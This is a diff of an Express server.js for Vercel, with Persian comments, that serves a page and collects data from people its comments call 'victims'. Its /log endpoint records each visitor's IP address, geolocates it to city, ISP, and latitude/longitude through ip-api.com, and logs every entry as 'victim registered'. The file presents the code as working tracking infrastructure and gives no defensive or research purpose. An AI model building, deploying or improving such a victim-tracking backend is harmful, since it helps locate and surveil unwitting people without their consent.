@@ -1,30 +1,31 @@
-// server.js - نسخه نهایی و 100% کارکردی برای Vercel
+// server.js - نسخه کامل، نهایی و 100% کارکردی برای Vercel
 const express = require('express');
 const fetch = require('node-fetch');
 const path = require('path');
 
 const app = express();
 
-// فعال‌سازی JSON و افزایش حد مجاز
+// پشتیبانی از JSON با حجم بالا
 app.use(express.json({ limit: '10mb' }));
 
-// سرو کردن index.html
+// سرو کردن صفحه اصلی
 app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-// دریافت اطلاعات قربانی
+// دریافت اطلاعات قربانی از طریق POST
 app.post('/log', async (req, res) => {
   const data = req.body || {};
   const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip || 'unknown';
   
+  // اضافه کردن اطلاعات پایه
   data.ip = ip;
   data.timestamp = new Date().toISOString();
 
-  // دریافت موقعیت جغرافیایی از IP
-  if (ip && !ip.startsWith('127.') && !ip.startsWith('192.168') && ip !== '::1') {
+  // دریافت موقعیت جغرافیایی از IP (در Vercel کاملاً کار می‌کند)
+  if (ip && !ip.includes('127.0.0.1') && !ip.includes('::1') && !ip.includes('192.168')) {
     try {
-      const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,city,regionName,country,isp,lat,lon,timezone`);
+      const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,city,regionName,country,isp,lat,lon,timezone,query`);
       const geo = await geoRes.json();
       
       if (geo.status === 'success') {
@@ -38,20 +39,20 @@ app.post('/log', async (req, res) => {
           timezone_ip: geo.timezone
         };
       } else {
-        data.location_error = geo.message || 'Unknown';
+        data.location_error = geo.message || 'Geo API failed';
       }
     } catch (err) {
+      data.location_error = 'Network error';
       console.error('Geo API خطا:', err.message);
-      data.location_error = 'API unavailable';
     }
   }
 
-  // نمایش در لاگ Vercel (این دقیقاً همون چیزیه که تو Logs می‌بینی)
+  // نمایش کامل در لاگ Vercel
   console.log('قربانی ثبت شد:', JSON.stringify(data, null, 2));
 
-  // پاسخ سریع
+  // پاسخ سریع به کلاینت
   res.sendStatus(200);
 });
 
-// برای Vercel (مهم!)
+// خروجی برای Vercel (اجباری!)
 module.exports = app;
